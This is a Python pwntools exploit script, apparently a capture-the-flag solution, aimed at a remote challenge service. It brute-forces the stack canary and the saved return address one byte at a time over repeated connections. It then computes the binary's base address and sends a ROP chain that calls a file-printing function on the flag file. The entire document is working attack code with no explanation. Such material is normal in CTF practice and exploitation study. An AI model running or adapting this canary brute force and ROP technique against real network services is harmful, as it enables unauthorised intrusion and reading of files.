#!/usr/bin/python

from pwn import *
from time import sleep
import threading

offset = 56

payload = "A"*offset


def leak(payload, canary=0, rbp=0, rip=0):

    address = ""
    i = 0
    counter = len(address)
    while i < 256:
        p = remote('one.jh2i.com' , 50023)
        #p = remote("0.0.0.0", 1234)

        p.recvuntil("[q] QUIT\n")
        payload = payload +  chr(i)

        p.send(payload)

        payload = payload[:-1:]
        p.recvline()
        i += 1
        #print p.recvuntil("Thanks for visiting\n", timeout=1)
        try:
            p.recvline()
            print "Found byte number ", counter, " = ", chr(i-1)
            address += chr(i-1)
            payload += chr(i-1)
            i = 0
            counter += 1
            if counter == 8:
                return address
        except:
            pass

        p.close()


#canary = u64(leak(payload, canary=1))
#print "The canary is ", hex(canary)

canary = leak(payload, canary=1)
payload += canary
payload += "M"*8

rip = u64(leak(payload, rip=1))
print "rip is ", hex(rip)

base_addr = rip - 0xdbf
print "The base address is ", hex(base_addr)


print_file = base_addr + 0x0000000000000fdc
print "Print Flag() @ ", hex(print_file)

flag = base_addr + 0x112a
print "Flag.txt @", hex(flag)

PopRsiR15 = base_addr + 0x0000000000001101
ret = base_addr + 0x00000000000009be

final_payload = payload + p64(PopRsiR15) + p64(flag) + p64(ret) + p64(print_file)

p = remote("one.jh2i.com", 50023)
p.recvuntil("[q] QUIT\n")
p.sendline(final_payload)

p.interactive()

